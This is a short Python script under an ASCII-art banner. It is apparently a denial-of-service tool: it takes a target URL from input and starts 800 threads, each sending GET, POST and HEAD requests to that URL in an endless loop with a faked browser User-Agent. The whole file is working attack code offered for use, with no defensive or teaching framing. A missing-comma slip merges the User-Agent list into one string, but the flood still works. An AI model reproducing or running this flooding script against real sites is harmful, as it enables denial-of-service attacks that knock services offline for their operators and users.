print("▄▄▄▄▄▄               ▄▄▄▄▄▄")
print("██▀▀▀▀█▄            ██▀▀▀▀█▄")
print("██    ██  ▀██  ███  ██    ██   ██▄████   ▄████▄")
print("██████▀    ██▄ ██   ██████▀    ██▀      ██▀  ▀██")
print("██          ████▀   ██         ██       ██    ██")
print("██           ███    ██         ██       ▀██▄▄██▀")
print("▀▀           ██     ▀▀         ▀▀         ▀▀▀▀")

import requests
from threading import Thread
import random

users = [
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061122 BonEcho/2.0.0.1pre"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061202 BonEcho/2.0.0.1pre"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1pre) Gecko/20061203 BonEcho/2.0.0.1pre"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070222 SeaMonkey/1.1.1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070224 lolifox/0.3.2"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070225 lolifox/0.32"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070227 BonEcho/2.0.0.2"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.21) Gecko/20090303 SeaMonkey/1.1.14"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.21) Gecko/20090331 K-Meleon/1.5.3"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.21) Gecko/20090403 Firefox/1.1.16"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070321"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3pre) Gecko/20070302 BonEcho/2.0.0.3pre"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070416 BonEcho/2.0.0.4"
]
headers = {
        'User-Agent' : random.choice(users)
}
url = input("url:")
def send():
        while True:
                requests.get(url, headers=headers)
                print("Get...")
                requests.post(url, headers=headers)
                print("post...")
                requests.head(url, headers=headers)
                print("head...")

if __name__ == '__main__':
        for i in range (800):
                thr = Thread(target=send)
                thr.start()
